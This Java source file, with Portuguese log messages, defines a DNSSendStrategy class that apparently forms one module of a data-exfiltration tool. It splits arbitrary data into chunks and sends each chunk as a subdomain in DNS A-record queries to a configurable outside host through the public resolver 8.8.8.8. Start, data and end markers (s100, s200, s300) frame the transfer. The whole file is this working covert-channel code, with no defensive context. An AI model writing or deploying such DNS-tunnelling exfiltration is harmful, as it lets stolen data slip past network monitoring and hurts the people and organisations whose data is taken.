package com.hase505.strategies.send;

import java.io.IOException;
import java.io.InterruptedIOException;
import java.net.UnknownHostException;
import org.xbill.DNS.*;
import org.xbill.DNS.Record;

public class DNSSendStrategy implements SendStrategy {
    private int chunkSize;
    private String hostName;


    public DNSSendStrategy(int chunkSize, String hostName) {
        this.chunkSize = chunkSize;
        this.hostName = hostName + ".";
    }

    public int getChunkSize() {
        return chunkSize;
    }
    public void setChunkSize(int chunkSize) {
        this.chunkSize = chunkSize;
    }

    public String getHostName() {
        return hostName;
    }
    public void setHostName(String hostName) {
        this.hostName = hostName;
    }

    public void send(String dataToSend) {

        String[] splitedData = splitIntoChunks(dataToSend);
        final String startOfCommunication = "s100.";
        final String startOfData = "s200.";
        final String endOfData = "s300.";

        Record record;
        Message query;

        Resolver resolver;

        try {
            resolver = new SimpleResolver("8.8.8.8");
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }



        System.out.println("Enviando comunicação inicial s100");
        try {
            record = Record.newRecord(Name.fromString(startOfCommunication+hostName),Type.A,DClass.IN);
            query = Message.newQuery(record);
            resolver.send(query);

        } catch (InterruptedIOException timeout){
            System.err.println("Timeout ao enviar consulta DNS: " + timeout.getMessage());
            return;
        } catch (IOException e) {
            System.err.println("Erro ao enviar consulta DNS: " + e.getMessage());
            return;
        }

        System.out.println("Enviando sinal de início do arquivo s200");
        try {
            record = Record.newRecord(Name.fromString(startOfData+hostName),Type.A,DClass.IN);
            query = Message.newQuery(record);
            resolver.send(query);
        } catch (InterruptedIOException timeout){
            System.err.println("Timeout ao enviar consulta DNS: " + timeout.getMessage());
            return;
        } catch (IOException e){
            System.err.println("Erro ao enviar consulta DNS: " + e.getMessage());
            return;
        }

        System.out.println("Enviando chunks do arquivo");
        try {
            for (String splitedDatum : splitedData) {
                record = Record.newRecord(Name.fromString(splitedDatum + "." + hostName), Type.A, DClass.IN);
                query = Message.newQuery(record);
                resolver.send(query);
            }
        } catch (InterruptedIOException timeout){
            System.err.println("Timeout ao enviar consulta DNS: " + timeout.getMessage());
        } catch (IOException e){
            System.err.println("Erro ao enviar consulta DNS: " + e.getMessage());
            return;
        }

        System.out.println("Enviando sinal de fim do arquivo s300");
        try {
            record = Record.newRecord(Name.fromString(endOfData+hostName),Type.A,DClass.IN);
            query = Message.newQuery(record);
            resolver.send(query);
        } catch (InterruptedIOException timeout){
            System.err.println("Timeout ao enviar consulta DNS: " + timeout.getMessage());
        } catch (IOException e){
            System.err.println("Erro ao enviar consulta DNS: " + e.getMessage());
            return;
        }

    }

    private String[] splitIntoChunks(String dataToSplit) {
        return dataToSplit.split("(?<=\\G.{" + chunkSize + "})");
    }


}
